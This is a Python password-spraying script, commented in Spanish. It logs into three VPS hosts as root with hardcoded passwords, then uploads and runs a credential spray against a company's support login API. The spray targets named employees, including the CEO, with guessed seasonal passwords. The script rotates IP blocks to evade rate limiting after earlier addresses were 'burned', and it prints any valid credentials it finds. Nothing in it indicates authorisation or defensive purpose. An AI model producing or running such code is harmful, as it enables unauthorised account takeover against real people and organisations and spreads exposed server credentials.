"""Test disperso desde 216.238.x.x VPS (diferente bloque de IP)."""
import paramiko, time

# VPS en 216.238.x.x (diferente a 64.177.x.x quemados)
VPSS = [
    {"ip": "216.238.69.202", "pass": "hL@4xY@k)Nt6z_CE"},
    {"ip": "216.238.75.117", "pass": "]Aq9mngH(_%ZV%jn"},
    {"ip": "216.238.93.120", "pass": "6W@zCQaCG=UekagG"},
]

TARGET = "https://soporte.disperso.com/api/auth/login"

# Top combos OSINT-derivados
TOP_COMBOS = [
    # Christian Ramirez — Analista Soporte/Dev (MAYOR PROB)
    ("cramirez@disperso.com", "Disperso2024!"),
    ("cramirez@disperso.com", "Disperso2025!"),
    ("cramirez@disperso.com", "Tuxpan2024!"),
    # Jonathan Hernandez
    ("jhernandez@disperso.com", "Disperso2024!"),
    ("jhernandez@disperso.com", "Tuxpan2024!"),
    # Patricia Erazo — CEO
    ("perazo@disperso.com", "Disperso2024!"),
    ("perazo@disperso.com", "Tuxpan2024!"),
    # Funcionales
    ("admin@disperso.com", "Disperso2024!"),
    ("soporte@disperso.com", "Soporte123!"),
    ("sales@disperso.com", "Disperso2024!"),
]

for vps in VPSS:
    print(f"\n{'='*50}")
    print(f"[*] Testing from {vps['ip']}...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username='root', password=vps['pass'], timeout=15)
        print(f"[+] Connected")
        
        # Quick test
        _, stdout, _ = client.exec_command(
            'curl -sk -X POST https://soporte.disperso.com/api/auth/login '
            '-H "Content-Type: application/json" '
            '-d \'{"email":"test@test.com","password":"test"}\' '
            '-w "\\nHTTP_CODE:%{http_code}" --max-time 10 2>&1'
        )
        out = stdout.read().decode().strip()
        print(f"  Test: {out[:200]}")
        
        if "429" not in out:
            print(f"  [!] IP {vps['ip']} está LIMPIA — lanzando spray preciso")
            
            # Run mini spray from this VPS
            spray_mini = """
import requests, time, json
urllib3_available = True
try:
    import urllib3
    urllib3.disable_warnings()
except:
    urllib3_available = False

TARGET = 'https://soporte.disperso.com/api/auth/login'
HEADERS = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Origin': 'https://soporte.disperso.com',
    'Referer': 'https://soporte.disperso.com/',
}
combos = [
    ('cramirez@disperso.com', 'Disperso2024!'),
    ('cramirez@disperso.com', 'Disperso2025!'),
    ('cramirez@disperso.com', 'Tuxpan2024!'),
    ('cramirez@disperso.com', 'Disperso123!'),
    ('jhernandez@disperso.com', 'Disperso2024!'),
    ('jhernandez@disperso.com', 'Tuxpan2024!'),
    ('perazo@disperso.com', 'Disperso2024!'),
    ('perazo@disperso.com', 'Tuxpan2024!'),
    ('sulloa@disperso.com', 'Disperso2024!'),
    ('dcanales@disperso.com', 'Disperso2024!'),
    ('wbriones@disperso.com', 'Disperso2024!'),
    ('econejeros@disperso.com', 'Disperso2024!'),
    ('admin@disperso.com', 'Disperso2024!'),
    ('admin@disperso.com', 'Disperso2025!'),
    ('soporte@disperso.com', 'Soporte123!'),
    ('soporte@disperso.com', 'Disperso2024!'),
    ('sales@disperso.com', 'Disperso2024!'),
    ('dev@disperso.com', 'Disperso2024!'),
    ('cto@disperso.com', 'Disperso2024!'),
    ('support@disperso.com', 'Support123!'),
]
hits = []
for email, pwd in combos:
    try:
        r = requests.post(TARGET, json={'email': email, 'password': pwd}, headers=HEADERS, timeout=12, verify=False)
        if r.status_code == 200:
            print(f'HIT!!! {email}:{pwd} -> {r.text[:300]}', flush=True)
            hits.append({'email': email, 'password': pwd, 'response': r.text[:500]})
        elif r.status_code == 429:
            print(f'429 RATELIMIT {email} -> {r.text[:100]}', flush=True)
        else:
            print(f'miss {email}:{pwd} -> {r.status_code}', flush=True)
    except Exception as e:
        print(f'ERR {email}: {e}', flush=True)
    time.sleep(3)
if hits:
    print('CREDENCIALES VALIDAS:')
    for h in hits:
        print(f"  {h[\'email\']}:{h[\'password\']}")
else:
    print('No hits en mini spray')
"""
            # Write to VPS and run
            sftp = client.open_sftp()
            with sftp.open('/tmp/mini_spray.py', 'w') as f:
                f.write(spray_mini)
            sftp.close()
            
            _, stdout, _ = client.exec_command('python3 -u /tmp/mini_spray.py 2>&1')
            mini_out = stdout.read().decode()
            print(f"\n  Mini spray result:\n{mini_out[:3000]}")
            break  # Found a working VPS, stop
        else:
            print(f"  IP {vps['ip']} también 429 — rate limit global")
        
        client.close()
        time.sleep(2)
        
    except Exception as e:
        print(f"  Error connecting: {e}")
